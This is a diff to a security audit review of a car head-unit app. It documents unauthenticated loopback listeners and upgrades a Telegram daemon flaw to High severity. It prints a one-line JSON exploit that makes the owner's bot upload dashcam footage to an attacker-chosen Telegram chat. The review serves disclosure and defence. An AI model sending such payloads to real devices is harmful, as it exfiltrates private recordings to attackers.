@@ -6,7 +6,7 @@
 This document answers two questions the owner asked:
 
 1. **Is the existing audit accurate?** — I re-derived the load-bearing findings from source rather than trusting the write-ups.
-2. **Did a second pass find anything the audit missed?** — Yes: three more unauthenticated loopback listeners, one of which is a usable spoofing primitive. None of them overturns the audit; they *reinforce* its central root cause.
+2. **Did a second pass find anything the audit missed?** — Yes: three more unauthenticated loopback listeners, one of which (F21) is a High-severity footage-exfiltration surface. None of them overturns the audit; they *reinforce* its central root cause.
 
 ---
 
@@ -36,16 +36,23 @@ I also confirmed the audit's **PR-review corrections are sound**, not hand-wavin
 
 ## Part 2 — What the second pass adds
 
-The audit's binding table (doc 01) lists four listeners: HTTP `:8080`, TCP command `:19876`, video WS `:8887`, surveillance IPC `:19877`. A full sweep for `ServerSocket`/`bind(` finds **three more loopback listeners** the audit does not enumerate. Of these, **one is a live unauth surface (F21), one is a live listener with a lower-value payload (F23), and one is dead code in this build (F22)** — the last flagged after Codex correctly pointed out its daemon is never started. They share the exact root cause the audit already names — *loopback binding treated as an authorization boundary* — so the live ones extend F1/F9/F16 rather than opening a new class.
+The audit's binding table (doc 01) lists four listeners: HTTP `:8080`, TCP command `:19876`, video WS `:8887`, surveillance IPC `:19877`. A full sweep for `ServerSocket`/`bind(` finds **three more loopback listeners** the audit does not enumerate. Of these, **one is a live High-severity exfiltration surface (F21), one is a live listener with a lower-value payload (F23), and one is dead code in this build (F22)** — the last two refined after Codex correctly caught that F22's daemon is never started and that F21 allows an attacker-chosen recipient. They share the exact root cause the audit already names — *loopback binding treated as an authorization boundary* — so the live ones extend F1/F9/F16 rather than opening a new class.
 
-### F21 — 🟡 Low/Medium: Telegram daemon IPC (`127.0.0.1:19880`) injects owner-facing alerts with no auth
+### F21 — 🟠 High: Telegram daemon IPC (`127.0.0.1:19880`) exfiltrates footage to an *attacker-chosen* chat, unauth
 
-`TelegramBotDaemon` runs a second server socket on `127.0.0.1:19880` (`handleIpcClient` → `processIpcCommand`) with **no caller authentication**. Its command set includes `sendMessage`, `sendVideo`, `notifyTunnel`, `notifyMotion`, `notifyCritical`. Any co-resident app (ordinary `INTERNET` permission, same as F1) can connect and make the owner's own bot deliver **attacker-authored messages to the owner's Telegram** — a spoofing/phishing primitive:
+`TelegramBotDaemon` runs a second server socket on `127.0.0.1:19880` (`handleIpcClient` → `processIpcCommand`) with **no caller authentication**. Any co-resident app (ordinary `INTERNET` permission, same as F1) can connect and issue its commands — `sendMessage`, `sendVideo`, `notifyTunnel`, `notifyMotion`, `notifyCritical`.
 
-- Inject a fake `notifyCritical` ("Break-in detected, tap to view: <attacker-link>") or a forged `notifyTunnel` URL that looks like it came from the car.
-- This composes with F13: a convincingly-timed fake alert can social-engineer the owner during the pairing window, or lure them to a page that phishes their session.
+> **Correction / severity upgrade (per Codex PR review — verified in source):** my first version claimed "the destination is fixed to `ownerChatId`, so the attacker cannot redirect footage to themselves." **That is wrong.** Both `sendMessage` and `sendVideo` read a **caller-supplied `chatId`** — `long chatId = cmd.optLong("chatId", ownerChatId)` — falling back to the owner *only when the field is omitted*. So a co-resident caller can name **any** destination chat. `sendVideo(chatId, path, caption)` then takes **any daemon-readable file path with no allowlist** and uploads it (files ≤ Telegram's ~50 MB limit; larger ones return a text notice). This is **direct footage/file exfiltration to attacker infrastructure**, not merely owner-alert spoofing — F21 is therefore High, not Low/Medium. Thanks to the reviewer for the catch.
 
-It is **not** direct exfiltration — the destination is fixed to `ownerChatId`, so the attacker cannot redirect footage to themselves this way — and it is **not** vehicle actuation. That bounds it below the Critical sockets. But it is a genuine unauthenticated cross-process capability the audit's Telegram doc (07) does not mention; doc 07 analyses only the *inbound* long-poll owner gate, not this *outbound* local IPC.
+**Exploit (given the preconditions below):**
+```json
+{"cmd":"sendVideo","chatId":<attacker-chat-id>,"path":"/sdcard/DCIM/BYDCam/event_XXXX.mp4"}
+```
+→ the owner's own bot uploads the recording straight to the attacker's Telegram. `sendMessage` with an attacker `chatId` similarly lets the attacker read nothing but *send* arbitrary text from the bot to any chat.
+
+**Preconditions:** Telegram must be configured (a `botToken` is present) and, for `sendVideo`, **video uploads enabled** (`videoUploadsEnabled` gate) and the message category enabled for `sendMessage`. These are common configurations for anyone using the Telegram integration — the whole point of which is footage-to-Telegram — so the precondition is not much of a barrier for the target population. It composes with F12 (world-readable footage on `/sdcard`) and F13 (fake alerts during pairing).
+
+The audit's Telegram doc (07) analyses only the *inbound* long-poll owner gate; this *outbound* local IPC — and its arbitrary-recipient exfiltration — is not covered there.
 
 ### F22 — 🟡 Low (dormant in the audited build): BYD event daemon telemetry (`127.0.0.1:19878`), unauth *if launched*
 
@@ -74,7 +81,7 @@ The single most important structural fact — mine and the audit's conclusion bo
 Every Critical/High in the audit, plus my three additions, is an instance of that one mistake. It is *fixable* (positive authentication on each channel, a non-world-readable secret store, TLS, signed updates/backups) and the audit's per-doc recommendations are the right fixes — but until they land, the honest summary for an owner deciding whether to run this is:
 
 - **Lowest-exposure posture:** do **not** enable the sing-box proxy, MQTT control, or any tunnel (zrok/cloudflared); keep the head unit off untrusted Wi-Fi. That removes F2, F7, F14 (remote), and F19 from your threat model entirely — they are all opt-in.
-- **Irreducible residual risk** even with everything off: any *co-resident app or ADB-context process* on the head unit can reach the unauthenticated loopback surfaces (F1 shell-RCE, F9 surveillance IPC, F21 alert-spoof, plus F5/F6/F16 secret exposure). If you trust everything installed on the unit and don't sideload, this is contained; if the unit runs untrusted apps, it is not.
+- **Irreducible residual risk** even with everything off: any *co-resident app or ADB-context process* on the head unit can reach the unauthenticated loopback surfaces (F1 shell-RCE, F9 surveillance IPC, F21 footage exfiltration to an attacker-chosen Telegram chat when the Telegram integration is on, plus F5/F6/F16 secret exposure). If you trust everything installed on the unit and don't sideload, this is contained; if the unit runs untrusted apps, it is not.
 - **Non-negotiable if any secret has ever shipped or been exported:** rotate them (doc 09 §recommendation 4). The committed `Safe`/`Enc` key is already public; treat anything it "protected" as public too.
 
 None of this requires trusting the maintainer to be *malicious* — the proxy-operator question (doc 03) is worth resolving with the OSINT commands there — but most of the risk is structural, independent of intent, and reachable by third parties the maintainer doesn't control either.
